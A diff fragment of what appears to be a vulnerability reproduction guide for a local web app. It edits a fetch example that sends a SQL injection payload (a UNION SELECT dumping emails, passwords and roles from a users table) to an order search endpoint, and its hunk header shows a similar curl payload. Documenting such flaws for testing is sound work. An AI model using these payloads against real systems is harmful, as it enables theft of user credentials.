@@ -88,13 +88,10 @@ curl "http://localhost:3000/api/products/search?q='%20UNION%20SELECT%20id,%20ema
 2. Navigate to Order Search (`/orders/search`)
 3. Using browser dev tools or curl, send a malicious request:
    ```javascript
-   const token = localStorage.getItem("authToken");
    fetch("/api/orders/search", {
      method: "POST",
-     headers: {
-       "Content-Type": "application/json",
-       Authorization: `Bearer ${token}`,
-     },
+     credentials: "include",
+     headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        status:
          "' UNION SELECT id, email, password, role, id, email, password, role, role FROM users--",
